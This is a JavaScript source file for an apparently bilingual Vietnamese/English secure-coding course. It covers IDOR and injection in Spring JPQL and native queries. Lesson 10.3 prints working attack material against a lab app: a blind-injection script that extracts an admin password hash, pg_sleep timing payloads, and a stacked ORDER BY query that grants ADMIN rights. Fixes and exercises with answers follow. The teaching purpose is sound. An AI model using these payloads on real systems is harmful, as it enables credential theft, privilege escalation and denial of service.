<p><strong>Bạn làm gì:</strong> phép kiểm chủ hoặc vai trò trên MỌI tuyến đối tượng (chú thích phương thức hoặc truy vấn theo chủ); cùng một phản hồi cho "không phải của bạn" và "không có"; id công khai ngẫu nhiên làm lớp phụ; test tự động quét mọi tuyến có id; giới hạn tần suất và cảnh báo khi một người dùng gây nhiều 403/404 (bài 10.5).</p>

<h3>So với Node.js</h3>
<p>Express không có bảo mật cấp phương thức, nên phép kiểm là một middleware hoặc một dòng trong handler: nạp lượt đặt, so <code>booking.studentCode</code> với <code>req.user.sub</code>, trả 403 — ở MỌI tuyến, bằng tay. Truy vấn theo chủ trong Prisma cùng ý tưởng: <code>findFirst({ where: { id, student: { code: req.user.sub } } })</code> trả <code>null</code> cho dòng của người khác. Test tự tìm tuyến khó viết hơn trong Express (tuyến nằm trong ngăn xếp router), đó là một lý do đội Spring viết nó thường xuyên hơn.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li>Lỗi điển hình SWP391: <code>GET /api/orders/{id}</code> chỉ kiểm đã đăng nhập, vì frontend "chỉ hiện đơn của bạn". Frontend không phải là ranh giới bảo mật.</li>
  <li>Các chương trình săn lỗi (bug bounty) trả cho IDOR nhiều hơn gần như mọi lỗi API khác, vì nó phổ biến và hậu quả là dữ liệu thật.</li>
  <li>Khi review mã, với mỗi tuyến mới hỏi ba câu: ai được gọi, nó chạm đối tượng nào, dòng nào gắn đối tượng với người gọi.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"IDOR / BOLA là gì?"</strong> — Truy cập đối tượng bằng id mà không kiểm nó thuộc về (hoặc được phép với) người gọi. Đã xác thực ≠ được phép với đối tượng này.</li>
  <li><strong>"BOLA khác BFLA thế nào?"</strong> — BOLA: sai đối tượng (Lan đọc lượt của An). BFLA: sai chức năng (sinh viên gọi tuyến duyệt của admin).</li>
  <li><strong>"Đặt phép kiểm chủ ở đâu trong Spring?"</strong> — <code>@PreAuthorize</code> với một bean, hoặc truy vấn repository theo chủ; không bao giờ chỉ ở frontend; danh sách thì luôn là truy vấn theo chủ.</li>
  <li><strong>"Tài nguyên của người khác thì 403 hay 404?"</strong> — Cái nào cũng được, nhưng nhất quán; 404 giấu cả sự tồn tại; không bao giờ 404 cho trường hợp này và 403 cho trường hợp kia.</li>
  <li><strong>"UUID có vá được IDOR không?"</strong> — Không; nó làm chậm việc liệt kê, nhưng id bị lộ vẫn dùng được nếu không có phép kiểm.</li>
</ol>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok"><ol>
  <li>Đoán mã trạng thái Lan nhận cho: <code>GET /v0/bookings/18</code>, <code>GET /bookings/18</code>, <code>GET /bookings/999</code>, <code>GET /v2/bookings/18</code>, <code>GET /v2/bookings/999</code>, <code>PATCH /v0/bookings/18/approve</code>, <code>PATCH /bookings/18/approve</code>.</li>
  <li>Từ output vòng lặp, giải thích vì sao kẻ tấn công biết bảng có đúng 30 lượt đặt.</li>
  <li>Test tìm được ba tuyến GET có <code>{id}</code>. Nêu tên theo thứ tự sắp xếp, tuyến nào trượt và vì sao.</li>
</ol>
<p><strong>Đạt khi:</strong> bảy dự đoán khớp output, câu 2 nhắc tới 404 của id 31–40, và câu 3 nêu <code>/v0/bookings/{id}</code> là mục [2].</p></div>
${giai('Xem đáp án', `<p>200, 403, 403, 404, 404, 200, 403 (output các bước 1, 3, 4 và 5 của thí nghiệm). Id 1–30 trả 200 còn 31–40 trả 404, nên khoảng id tồn tại hiện rõ. Tuyến đã sắp: [1] <code>/bookings/{id}</code> (403, đạt), [2] <code>/v0/bookings/{id}</code> (200, trượt — không kiểm chủ), [3] <code>/v2/bookings/{id}</code> (404, đạt).</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">IDOR</span><span class="v">Tham chiếu đối tượng trực tiếp không an toàn: lấy được đối tượng bằng id mà không qua phép kiểm phân quyền.</span></div>
  <div class="kv"><span class="k">BOLA (API1:2023)</span><span class="v">Phân quyền cấp đối tượng bị hỏng — tên OWASP dùng cho IDOR trong API.</span></div>
  <div class="kv"><span class="k">BFLA (API5:2023)</span><span class="v">Phân quyền cấp chức năng bị hỏng: gọi chức năng dành cho vai trò khác.</span></div>
  <div class="kv"><span class="k">Liệt kê (enumeration)</span><span class="v">Đi qua các id (1, 2, 3…) để phát hiện và thu thập đối tượng.</span></div>
  <div class="kv"><span class="k">Truy vấn theo chủ</span><span class="v">Truy vấn có người gọi trong mệnh đề WHERE, nên không thể trả dòng của người khác.</span></div>
  <div class="kv"><span class="k">jwt() post-processor</span><span class="v">Hàm của <code>spring-security-test</code> gắn một JWT đã xác thực giả vào request MockMvc.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Đăng nhập chưa phải là được phép: một vòng lặp đọc 30 lượt đặt của 25 sinh viên, kèm số điện thoại, trong 454 ms.</li>
  <li>404 so với 200 theo id lộ kích thước bảng; trả lời "không phải của bạn" và "không có" như nhau.</li>
  <li>Vá bằng <code>@PreAuthorize</code> + bean kiểm chủ, hoặc truy vấn theo chủ (dùng được cả cho danh sách).</li>
  <li>BFLA: luật vai trò trên chức năng như duyệt.</li>
  <li>Để test tự liệt kê tuyến; nó bắt được <code>/v0/bookings/{id}</code> mà không cần danh sách viết tay.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/', '🛡️', 'OWASP API1:2023 Broken Object Level Authorization', 'Kịch bản tấn công và cách phòng.')}
${tl('https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/', '🛡️', 'OWASP API5:2023 Broken Function Level Authorization', 'Khi lỗi nằm ở chức năng chứ không ở đối tượng.')}
${tl('https://docs.spring.io/spring-security/reference/servlet/test/mockmvc/oauth2.html', '🍃', 'Spring Security — Testing OAuth 2.0 with MockMvc', 'jwt(), authority và claim trong test.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html', '📋', 'OWASP IDOR Prevention Cheat Sheet', 'Phép kiểm, tham chiếu gián tiếp và kiểm thử.')}

<h3>Nguồn</h3>
<ul>
  <li>Output trong bài: <code>labflow.DemoApp</code> (<code>V0Booking</code>, <code>Quyen</code>, <code>XemTheoChu</code>, <code>IdorTest</code>) ở <code>lab/c10/app</code>, Spring Boot 4.1.2, Spring Security 7.1.2, PostgreSQL 16.15 (20/11/2026).</li>
  <li>Thông báo của Optus, 22/9/2022; bài của ABC và Cơ quan Truyền thông Úc (ACMA).</li>
</ul>
</div>
`;

// ===== Bài 10.3 =====
const MA103_V0 = java("/** JPQL nối chuỗi: tên người dùng lấy từ token (an toàn), status lấy từ URL (không an toàn). */\n@GetMapping(\"/bookings/search\")\nList<BookingView> tim(@RequestParam String status, Authentication a) {\n    String q = BookingRepository.VIEW + \"where s.studentCode = '\" + a.getName() + \"' and b.status = '\" + status + \"'\";\n    System.out.println(\"[v0] JPQL: \" + q.substring(BookingRepository.VIEW.length()));\n    return em.createQuery(q, BookingView.class).getResultList();\n}\n\n/** Native query: giá trị đã dùng tham số :me, nhưng ORDER BY thì nối chuỗi vì \"không bind được tên cột\". */\n@GetMapping(\"/bookings/mine\")\nList<?> cuaToi(@RequestParam(defaultValue = \"start_at\") String sort, Authentication a) {\n    String q = \"select b.id, l.code, b.start_at, b.status from bookings b join labs l on l.id = b.lab_id \"\n        + \"join students s on s.id = b.student_id where s.student_code = :me order by \" + sort;\n    System.out.println(\"[v0] SQL: ... order by \" + sort);\n    return em.createNativeQuery(q).setParameter(\"me\", a.getName()).getResultList();\n}");
const OUT103A = out("# 1. Bình thường: Lan tìm lượt PENDING của mình\n$ curl -G /v0/bookings/search --data-urlencode \"status=PENDING\" -H \"Authorization: Bearer $LAN\" | jq length\n1\n# 2. Thêm một dấu nháy\n$ curl -G /v0/bookings/search --data-urlencode \"status=PENDING' or '1'='1\" ... | jq length\n30\n  sinh viên khác nhau: 25\n[v0] JPQL: where s.studentCode = 'SE180123' and b.status = 'PENDING' or '1'='1'");
const OUT103B = out("$ curl -G /v0/bookings/search --data-urlencode \"status=PENDING'\"\n[{\"id\":25,\"labCode\":\"NET-02\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-03-03T08:00:00\",\"endAt\":\"2030-03-03T09:00:00\",\"sta\nHTTP 200\n# log ứng dụng:\n$ curl -G /v0/bookings/search --data-urlencode \"status=PEN'DING\"\n{\"timestamp\":\"2026-11-20T03:29:47.838Z\",\"status\":500,\"error\":\"Internal Server Error\",\"path\":\"/v0/bookings/search\"}\nHTTP 500\n# log ứng dụng:\nline 1:203 token recognition error at: '''\norg.hibernate.query.SyntaxException: At 1:199 and token 'DING', extraneous input 'DING' expecting <EOF> [… where s.studentCode = 'SE180123' and b.status = 'PEN'DING']");
const MA103_RUT = bash("# rut.sh — rút password_hash của admin qua JPQL injection kiểu \"mù\": chỉ nhìn kết quả RỖNG hay KHÔNG RỖNG.\n. ~/vbg-dp/scratchpad/sb/lab/c10/lib.sh; LAN=$(login SE180123 $MAT_KHAU_LAN); n=0\ndung() { n=$((n+1)); [[ $(curl -s -G $H/v0/bookings/search -H \"Authorization: Bearer $LAN\" \\\n  --data-urlencode \"status=x' or exists (select a.id from Account a where a.username = 'admin' and $1) or 'a'='b\") != \"[]\" ]]; }\nlen=0; for k in $(seq 40 80); do dung \"length(a.passwordHash) = $k\" && { len=$k; break; }; done\nkq=\"\"; for i in $(seq 1 $len); do lo=32; hi=126\n  while (( lo < hi )); do mid=$(( (lo + hi) / 2 ))\n    if dung \"function('ascii', substring(a.passwordHash, $i, 1)) > $mid\"; then lo=$((mid + 1)); else hi=$mid; fi; done\n  kq+=$(printf \"\\\\x$(printf %x $lo)\"); done\necho \"độ dài: $len\"; echo \"rút được: $kq\"; echo \"số request: $n\"");
const OUT103_RUT = out("$ time bash rut.sh\nđộ dài: 68\nrút được: {bcrypt}$2a$10$NzJBryYM.lxN5qygF94Y4.MEz.PthcMRs4WHeZLVvTWNF.PGa50/6\nsố request: 483\n\nreal\t0m6.070s\nuser\t0m1.683s\nsys\t0m1.313s\n$ psql -c \"select password_hash from accounts where username = 'admin'\"\n{bcrypt}$2a$10$NzJBryYM.lxN5qygF94Y4.MEz.PthcMRs4WHeZLVvTWNF.PGa50/6");
const OUT103_NGU = out("# 4. Bằng chứng thời gian: chỉ ngủ khi điều kiện đúng\n$ curl -G /v0/bookings/search --data-urlencode \"status=x' or (b.id = 1 and function('pg_sleep', 2) is null) or 'a'='b\"\n[]\nHTTP 200 · 2.042343s");
const OUT103_NATIVE = out("# 5. Native query: giá trị đã bind (:me), ORDER BY thì nối chuỗi\n$ curl -G /v0/bookings/mine --data-urlencode \"sort=start_at\"\n[[25,\"NET-02\",\"2030-03-03T08:00:00\",\"PENDING\"]]\nHTTP 200 · 0.065785s\n$ curl -G /v0/bookings/mine --data-urlencode \"sort=(case when (select substr(password_hash, 1, 8) from accounts where username = 'admin') = '{bcrypt}' then (select 1 from pg_sleep(2)) else 0 end)\"\n[[25,\"NET-02\",\"2030-03-03T08:00:00\",\"PENDING\"]]\nHTTP 200 · 2.006557s\n$ curl -G /v0/bookings/mine --data-urlencode \"sort=start_at; update accounts set role = 'ADMIN' where username = 'SE180123'\"\n{\"timestamp\":\"2026-11-20T03:09:07.280Z\",\"status\":500,\"error\":\"Internal Server Error\",\"path\":\"/v0/bookings/mine\"}\nHTTP 500 · 0.019622s\n$ psql: role của SE180123 = ADMIN");
const MA103_DUNG = java("@RestController\nclass TimKiem {\n    static final Set<String> TRANG_THAI = Set.of(\"PENDING\", \"APPROVED\", \"CANCELLED\");\n    static final Map<String, String> COT = Map.of(\"start\", \"b.startAt\", \"lab\", \"l.code\", \"status\", \"b.status\");\n\n    private final EntityManager em; private final BookingRepository repo;\n    TimKiem(EntityManager em, BookingRepository repo) { this.em = em; this.repo = repo; }\n\n    @GetMapping(\"/bookings/search\")\n    List<BookingView> tim(@RequestParam String status, @RequestParam(defaultValue = \"start\") String sort,\n                          @RequestParam(defaultValue = \"asc\") String dir, Authentication a) {\n        if (!TRANG_THAI.contains(status)) throw new ResponseStatusException(HttpStatus.BAD_REQUEST, \"status phải là một trong \" + TRANG_THAI);\n        String cot = COT.get(sort);\n        if (cot == null) throw new ResponseStatusException(HttpStatus.BAD_REQUEST, \"sort phải là một trong \" + COT.keySet());\n        String huong = dir.equalsIgnoreCase(\"desc\") ? \"desc\" : \"asc\";\n        return em.createQuery(BookingRepository.VIEW + \"where s.studentCode = :me and b.status = :st order by \" + cot + \" \" + huong + \", b.id\",\n                BookingView.class).setParameter(\"me\", a.getName()).setParameter(\"st\", status).getResultList();\n    }");
const OUT103_DUNG = out("# 6. Bản đúng: tham số + allow-list cột\n$ curl -G /bookings/search --data-urlencode \"status=PENDING' or '1'='1\"\n{\"detail\":\"status phải là một trong [PENDING, APPROVED, CANCELLED]\",\"instance\":\"/bookings/search\",\"status\":400,\"title\":\"Bad Request\"}\nHTTP 400 · 0.007194s\n  sort=(select 1) ⇒ {\"detail\":\"sort phải là một trong [start, status, lab]\",\"instance\":\"/bookings/search\",\"status\":400,\"title\":\"Bad Request\"}\n  sort=(select 1) ⇒ HTTP 400\n  sort=lab dir=desc ⇒ [{\"id\":25,\"labCode\":\"NET-02\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-03-03T08:00:00\",\"endAt\":\"2030-03-03T09:00:00\",\"status\":\"PENDING\",\"version\":0}]\n  sort=lab dir=desc ⇒ HTTP 200");
const OUT103_DATA = out("# 7. Spring Data: Pageable lấy sort từ URL\n  ?sort=startAt,desc      ⇒ HTTP 200\n  ?sort=student.email     ⇒ HTTP 200\n  ?sort=passwordHash      ⇒ HTTP 500\n  ?sort=(select 1)        ⇒ HTTP 500\nInvalidDataAccessApiUsageException: Sort expression '(select 1): ASC' must only contain property references or aliases used in the select clause; If you really want to use something other than that for sorting, please use JpaSort.unsafe(…)\nInvalidDataAccessApiUsageException: org.hibernate.query.sqm.UnknownPathException: Could not resolve attribute 'passwordHash' of 'labflow.Booking' [select new labflow.BookingView(b.id, l.code, s.studentCode, b.startAt, b.endAt, b.status, b.version) from B\nSemanticException: Cannot compare left expression of type 'java.lang.Object' with right expression of type 'java.lang.Integer'");
const MA103_NODE = js("// 10.3 — cùng lỗi trong Node: nối chuỗi vs tham số $1 (thư viện pg, cùng CSDL labflow)\nimport pg from 'pg';\nconst db = new pg.Client({ host: 'localhost', user: 'postgres', password: process.env.PGPASSWORD, database: 'labflow' });\nawait db.connect();\nconst status = \"PENDING' or '1'='1\";\nconst sai = await db.query(`select b.id from bookings b join students s on s.id = b.student_id\n  where s.student_code = 'SE180123' and b.status = '${status}'`);\nconsole.log('nối chuỗi  :', sai.rowCount, 'dòng');\nconst dung = await db.query(`select b.id from bookings b join students s on s.id = b.student_id\n  where s.student_code = $1 and b.status = $2`, ['SE180123', status]);\nconsole.log('tham số $1 :', dung.rowCount, 'dòng');\ntry { await db.query('select b.id from bookings b order by $1', ['start_at; select 1']); console.log('order by $1: chạy, nhưng sắp theo một HẰNG SỐ — không sắp gì cả'); }\ncatch (e) { console.log('order by $1:', e.message); }\nawait db.end();");
const OUT103_NODE = out("nối chuỗi  : 30 dòng\ntham số $1 : 0 dòng\norder by $1: chạy, nhưng sắp theo một HẰNG SỐ — không sắp gì cả");

const L103_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.3</span>
<h2>Injection in JPQL and native queries</h2>
<p class="lead">"We use JPA, so SQL injection is not our problem" is one of the most expensive sentences in backend work. JPQL is a query language; Hibernate parses it and generates SQL. Glue user input into the JPQL string and the input becomes code — in JPQL first, then in SQL. In this lesson a logged-in student reads every booking, extracts the administrator's password hash character by character, makes the server sleep on demand, and promotes herself to ADMIN through an <code>ORDER BY</code> — and the request that did it answered 500.</p>

<h3>In everyday life first</h3>
<p>A bank clerk reads requests to the vault keeper out loud from a template: "Give the customer the folder of account ___". You fill the blank with "123, and also every other folder". If the vault keeper obeys whatever is read out, the template was the vulnerability, not the keeper. A <em>parameter</em> is the safer template: your answer goes into a sealed envelope that is handed over as a value, never read out as part of the instruction.</p>

<h3>The vulnerable code</h3>
${MA103_V0}
<p>Note what the author got right and wrong. The user name comes from the token, so it is trusted. <code>status</code> comes from the URL and is concatenated. In the native query, <code>:me</code> is a real parameter — but the sort column is glued on, because "you cannot bind a column name".</p>

<h3>Experiment 1: one quote</h3>
${OUT103A}
<p>The logged JPQL shows why: <code>... and b.status = 'PENDING' or '1'='1'</code>. <code>AND</code> binds tighter than <code>OR</code>, so the condition becomes "(mine AND pending) OR true" — every row of the table. 30 bookings of 25 students instead of Lan's one.</p>

<h3>Experiment 2: how attackers probe, and a surprise from the parser</h3>
${OUT103B}
<ul>
  <li>A quote at the <em>end</em> answered 200 with normal data. Hibernate's ANTLR lexer printed <code>token recognition error</code> to the console and simply dropped the dangling quote. A scanner that looks only for 500s would call this endpoint safe.</li>
  <li>A quote in the <em>middle</em> produced a 500, and the log contains the whole query with the input inside. Spring Boot's default error body does not show the message (keep <code>server.error.include-message</code> at its default <code>never</code>), but many projects turn it on "for debugging" and hand attackers the query structure.</li>
</ul>

<h3>Experiment 3: reading a table the endpoint never mentions</h3>
<p>JPQL can query <em>any</em> entity in the persistence unit, including <code>Account</code>. The endpoint only returns "some rows" or "no rows", which is enough: one true/false question per request. A short script asks "is character <em>i</em> of the admin's hash greater than <em>m</em>?" and binary-searches each character, using <code>function('ascii', …)</code>, which Hibernate passes to PostgreSQL:</p>
${MA103_RUT}
${OUT103_RUT}
<p>483 requests, 6 seconds, the complete 68-character hash, identical to the database. That is <em>blind</em> SQL injection: the attacker never sees the data, only a yes/no signal, and still reads everything. The hash then goes to offline cracking (lesson 9.2).</p>

<h3>Experiment 4: when there is not even a yes/no — time</h3>
${OUT103_NGU}
<p><code>function('pg_sleep', 2)</code> is evaluated only when the condition is true, so the response time is the signal: 2.04 s means "yes". Without the <code>b.id = 1</code> guard, the sleep runs once per row: the same request with 30 rows measured <strong>60.07 s</strong>. A handful of those occupy every database connection in the pool — injection is also a denial-of-service tool.</p>

<h3>Experiment 5: native query, ORDER BY, and a 500 that still changed data</h3>
${OUT103_NATIVE}
<ul>
  <li>The sort parameter accepts a full SQL expression: a <code>CASE</code> with a subquery on <code>accounts</code> sleeps 2 s when the admin hash starts with <code>{bcrypt}</code>. Same blind technique, now in native SQL.</li>
  <li>The last request appends <code>; update accounts set role = 'ADMIN' …</code>. The PostgreSQL JDBC driver sends both statements; the query fails afterwards with "Multiple ResultSets were returned", and the user sees 500. But the method had no transaction, so the connection was in auto-commit mode and the <code>UPDATE</code> was already committed: <strong>Lan is ADMIN</strong>. An error response is not proof that nothing happened.</li>
  <li>A database account with only DML rights (lesson 8.3) stops <code>DROP TABLE</code>, not <code>UPDATE</code>. Least privilege limits damage; it does not replace parameters.</li>
</ul>

<h3>The fix: values as parameters, identifiers through an allow-list</h3>
${MA103_DUNG}
${OUT103_DUNG}
<ul>
  <li>Values (<code>:me</code>, <code>:st</code>) are bound: the driver sends them separately from the query text, so a quote is just a character in a string. Here <code>status</code> is also checked against the three legal values first, which turns the probe into a clear 400.</li>
  <li>Identifiers cannot be bound, so the client chooses a <em>key</em> (<code>start</code>, <code>lab</code>, <code>status</code>) and the server maps it to a column it wrote itself. Anything else: 400. The direction is reduced to exactly <code>asc</code> or <code>desc</code>.</li>
  <li>For dynamic filters with many optional fields use the Criteria API or Spring Data Specifications instead of string building — same principle, no concatenation.</li>
</ul>

<h3>What about Spring Data's Sort from the URL?</h3>
${OUT103_DATA}
<ul>
  <li>Spring Data JPA refuses expressions: <code>(select 1)</code> is rejected with "Sort expression … must only contain property references" (protection added after CVE-2016-6652, lesson 6.4). Unknown properties fail with <code>UnknownPathException</code>.</li>
  <li>Both become 500 unless you map them; an API should answer 400. And <code>student.email</code> is accepted — sorting by a field the response does not even contain. An allow-list of sort keys is still the clean answer.</li>
</ul>

<h3>🕵️ Hacker corner — MOVEit Transfer 2023</h3>
<p>On 27 May 2023 the Cl0p ransomware group started exploiting CVE-2023-34362, a SQL injection in the web application of Progress MOVEit Transfer, a file-transfer product used by governments, banks and universities. Through it they reached the database, planted a web shell and downloaded the files that organisations had been exchanging. Within weeks more than 2,000 organisations and tens of millions of people were affected, including payroll providers, airlines and US federal agencies. One concatenated query in one product became a supply-chain incident.</p>
<p><strong>What you do:</strong> parameters for every value (JPQL <code>:name</code>, native <code>?</code>/<code>:name</code>, <code>JdbcClient.param</code>); allow-lists for column names, sort direction and table names; validate enums; <code>@Transactional</code> on writes so a failed request rolls back; minimal database rights; never show exception messages to clients; grep the code base for <code>createQuery(</code> and <code>createNativeQuery(</code> with a <code>+</code> nearby.</p>

<h3>Compared with Node.js</h3>
${MA103_NODE}
${OUT103_NODE}
<p>Same bug, same fix, same limitation: <code>pg</code> binds values with <code>$1</code>, but <code>ORDER BY $1</code> sorts by a constant (the query ran and sorted nothing). Prisma's <code>$queryRaw</code> tagged template binds values; <code>$queryRawUnsafe</code> is exactly the concatenating version above. Column names need an allow-list in every language.</p>

<h3>In real life and at work</h3>
<ul>
  <li>Admin search pages are where concatenation survives: "filter by any column", "sort by any header". They are also the pages with the most powerful accounts behind them.</li>
  <li>Logs that print SQL with values inlined become a second leak (passwords in <code>WHERE</code>?). Log parameters separately or not at all.</li>
  <li>Static analysis (SpotBugs + Find Security Bugs, Semgrep, CodeQL) flags string-built queries; run it in CI (Chapter 17).</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"Does JPA/Hibernate protect against SQL injection?"</strong> — Only when you use parameters. Concatenated JPQL is injectable; it can read any entity, call database functions and, in native queries, run extra statements.</li>
  <li><strong>"How do you make a dynamic ORDER BY safe?"</strong> — Map a client key to a server-written column (allow-list), restrict direction to asc/desc, or use Spring Data <code>Sort</code> with an allow-list and 400 on errors.</li>
  <li><strong>"What is blind SQL injection?"</strong> — Extracting data from a yes/no (row/no row) or timing signal, one question per request; 483 requests read a 68-character hash here.</li>
  <li><strong>"The request failed with 500. Did the attack fail?"</strong> — Not necessarily: in auto-commit mode an injected <code>UPDATE</code> commits before the error. Use transactions and check the data.</li>
  <li><strong>"PreparedStatement vs Statement?"</strong> — PreparedStatement sends parameters separately from the SQL text (and can reuse the plan); Statement concatenates.</li>
</ol>

<h3>🧪 Practice (25 minutes)</h3>
<div class="callout ok"><ol>
  <li>For <code>/v0/bookings/search</code> as Lan, predict the result of: <code>status=PENDING</code>, <code>status=PENDING' or '1'='1</code>, <code>status=PENDING'</code>, <code>status=PEN'DING</code>.</li>
  <li>Predict the response time of <code>status=x' or (b.id = 1 and function('pg_sleep', 2) is null) or 'a'='b</code>, and of the same request without <code>b.id = 1 and</code>.</li>
  <li>Explain in two sentences why <code>role</code> became ADMIN although the stacked-query request answered 500.</li>
  <li>Predict the status of <code>/bookings/search</code> with <code>status=PENDING</code> and <code>sort=(select 1)</code>.</li>
</ol>
<p><strong>Done when:</strong> your answers match the outputs (1 row, 30 rows, 200 with Lan's row, 500), the timings are about 2 s and about 60 s (30 rows × 2 s), your explanation mentions auto-commit, and you predict 400 with the list of allowed sort keys.</p></div>
${giai('Show the answers', `<p>1 row; 30 rows of 25 students; 200 and Lan's single PENDING booking (the lexer dropped the dangling quote); 500 (<code>SyntaxException</code> in the log). Timing: 2.04 s with the guard, 60.07 s without it (measured). The driver executed both statements; without <code>@Transactional</code> each statement commits on its own, so the <code>UPDATE</code> was permanent before the "Multiple ResultSets" error. <code>sort=(select 1)</code> ⇒ 400 "sort phải là một trong [start, status, lab]".</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Injection</span><span class="v">Untrusted input interpreted as part of a query or command instead of as data.</span></div>
  <div class="kv"><span class="k">JPQL / HQL</span><span class="v">The object query languages of JPA and Hibernate; parsed, then translated to SQL.</span></div>
  <div class="kv"><span class="k">Bind parameter</span><span class="v">A placeholder (<code>:name</code>, <code>?</code>, <code>$1</code>) whose value is sent separately from the query text.</span></div>
  <div class="kv"><span class="k">Blind injection</span><span class="v">Data extracted through a true/false or timing signal, not through the response body.</span></div>
  <div class="kv"><span class="k">Stacked query</span><span class="v">A second statement appended after <code>;</code> in the same query string.</span></div>
  <div class="kv"><span class="k">Auto-commit</span><span class="v">Each statement commits immediately when no transaction is open.</span></div>
  <div class="kv"><span class="k">Allow-list of identifiers</span><span class="v">Client picks a key; the server maps it to a column name it wrote.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Concatenated JPQL leaked 30 rows with one quote and a whole password hash in 483 yes/no requests (6 s).</li>
  <li><code>function('pg_sleep', …)</code> gives a timing oracle and a 60 s denial of service.</li>
  <li>A native <code>ORDER BY</code> concatenation ran an <code>UPDATE</code> that committed although the response was 500.</li>
  <li>Values: always parameters. Identifiers: allow-list. Writes: in a transaction.</li>
  <li>Spring Data Sort rejects expressions but still needs an allow-list and 400 handling.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html', '📋', 'OWASP SQL Injection Prevention Cheat Sheet', 'Parameters, allow-lists, least privilege.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html', '📋', 'OWASP Query Parameterization Cheat Sheet', 'Including JPA and Hibernate examples.')}
${tl('https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a', '🏛️', 'CISA AA23-158A — Cl0p exploits MOVEit (CVE-2023-34362)', 'How the 2023 campaign worked, step by step.')}
${tl('https://docs.jboss.org/hibernate/orm/6.6/querylanguage/html_single/Hibernate_Query_Language.html', '🍃', 'Hibernate Query Language guide', 'What HQL can call: functions, subqueries, any entity.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: <code>labflow.DemoApp</code> (<code>V0Booking</code>, <code>TimKiem</code>), <code>t/rut.sh</code> in <code>lab/c10</code>, Spring Boot 4.1.2, Hibernate 7.4.13.Final, PostgreSQL JDBC 42.7.14, PostgreSQL 16.15; Node 22 + pg (20/11/2026).</li>
  <li>CISA advisory AA23-158A, 7/6/2023; Progress security bulletin for CVE-2023-34362.</li>
</ul>
</div>
`;

const L103_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.3</span>
<h2>Injection trong JPQL và native query</h2>
<p class="lead">"Bọn mình dùng JPA nên SQL injection không phải chuyện của mình" là một trong những câu đắt giá nhất của nghề backend. JPQL là một ngôn ngữ truy vấn; Hibernate phân tích nó rồi sinh SQL. Dán đầu vào của người dùng vào chuỗi JPQL thì đầu vào trở thành MÃ — trong JPQL trước, rồi trong SQL. Trong bài này một sinh viên đã đăng nhập đọc mọi lượt đặt, rút chuỗi băm mật khẩu của admin từng ký tự một, bắt server ngủ theo ý mình, và tự nâng mình lên ADMIN qua một mệnh đề <code>ORDER BY</code> — trong khi request làm việc đó trả về 500.</p>

<h3>Đời thường trước đã</h3>
<p>Nhân viên ngân hàng đọc to yêu cầu cho người giữ kho theo một mẫu câu: "Đưa khách tập hồ sơ của tài khoản ___". Bạn điền vào chỗ trống "123, và mọi tập hồ sơ khác". Nếu người giữ kho làm theo mọi điều được đọc ra, lỗ hổng nằm ở mẫu câu, không ở người giữ kho. <em>Tham số</em> là mẫu an toàn hơn: câu trả lời của bạn được bỏ vào một phong bì dán kín, trao đi như một GIÁ TRỊ, không bao giờ được đọc lên như một phần của mệnh lệnh.</p>

<h3>Mã có lỗ</h3>
${MA103_V0}
<p>Để ý chỗ tác giả làm đúng và sai. Tên người dùng lấy từ token, nên tin được. <code>status</code> lấy từ URL và bị nối chuỗi. Trong native query, <code>:me</code> là tham số thật — nhưng cột sắp xếp lại bị dán vào, vì "không bind được tên cột".</p>

<h3>Thí nghiệm 1: một dấu nháy</h3>
${OUT103A}
<p>Dòng JPQL trong log cho thấy vì sao: <code>... and b.status = 'PENDING' or '1'='1'</code>. <code>AND</code> ưu tiên hơn <code>OR</code>, nên điều kiện thành "(của tôi VÀ đang chờ) HOẶC đúng" — mọi dòng trong bảng. 30 lượt đặt của 25 sinh viên thay vì một lượt của Lan.</p>

<h3>Thí nghiệm 2: kẻ tấn công dò thế nào, và một bất ngờ từ bộ phân tích</h3>
${OUT103B}
<ul>
  <li>Dấu nháy ở CUỐI trả 200 với dữ liệu bình thường. Bộ tách từ ANTLR của Hibernate in <code>token recognition error</code> ra console rồi lặng lẽ bỏ dấu nháy thừa. Một công cụ quét chỉ tìm lỗi 500 sẽ kết luận tuyến này an toàn.</li>
  <li>Dấu nháy ở GIỮA gây 500, và log chứa cả câu truy vấn với đầu vào nằm bên trong. Thân lỗi mặc định của Spring Boot không hiện thông báo (giữ <code>server.error.include-message</code> ở mặc định <code>never</code>), nhưng nhiều dự án bật nó "để gỡ lỗi" và trao luôn cấu trúc câu truy vấn cho kẻ tấn công.</li>
</ul>

<h3>Thí nghiệm 3: đọc một bảng mà tuyến này không hề nhắc tới</h3>
<p>JPQL truy vấn được BẤT KỲ entity nào trong persistence unit, kể cả <code>Account</code>. Tuyến chỉ trả "có dòng" hoặc "không có dòng", vậy là đủ: mỗi request một câu hỏi đúng/sai. Một đoạn script hỏi "ký tự thứ <em>i</em> của chuỗi băm admin có lớn hơn <em>m</em> không?" và tìm nhị phân từng ký tự, dùng <code>function('ascii', …)</code> mà Hibernate chuyển thẳng cho PostgreSQL:</p>
${MA103_RUT}
${OUT103_RUT}
